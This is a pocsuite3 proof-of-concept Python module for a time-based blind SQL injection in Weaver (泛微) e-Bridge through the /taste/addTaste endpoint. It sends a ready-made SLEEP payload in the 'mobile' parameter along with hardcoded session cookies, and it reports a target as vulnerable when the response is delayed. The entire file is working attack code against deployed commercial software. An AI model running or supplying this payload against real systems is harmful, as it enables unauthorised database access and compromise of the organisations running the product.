# _*_ coding:utf-8 _*_
# @Time : 2023/12/12
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class fanwei_yunqiaoe_bridge_sql(POCBase):
    pocDesc = '''泛微云桥 e-Bridge SQL注入'''
    author = '炼金术师诸葛亮'
    createDate = '2023-12-12'
    name = '泛微云桥 e-Bridge SQL注入漏洞'



    def _verify(self):

        result = {}
        url = self.url+ '/taste/addTaste?company=1&userName=1&openid=1&source=1&mobile=1%27%20AND%20(SELECT%208094%20FROM%20(SELECT(SLEEP(9-(IF(18015%3e3469,0,4)))))mKjk)%20OR%20%27KQZm%27=%27REcX'
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
            "Accept": "*/*",
            'Accept-Encoding': 'gzip',
            'SL-CE-SUID': '25',
            'Cookie': 'EBRIDGE_JSESSIONID=CAE1276AE2279FD98B96C54DE624CD18; sl-session=BmCjG8ZweGWzoSGpQ1QgQg==; EBRIDGE_JSESSIONID=21D2D790531AD7941D060B411FABDC10'
        }
        try:


            response = requests.get(url, headers=headers)
            if response.status_code == 200 and response.elapsed.total_seconds() >= 9:
                result['VerifyInfo'] = {}


            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(fanwei_yunqiaoe_bridge_sql)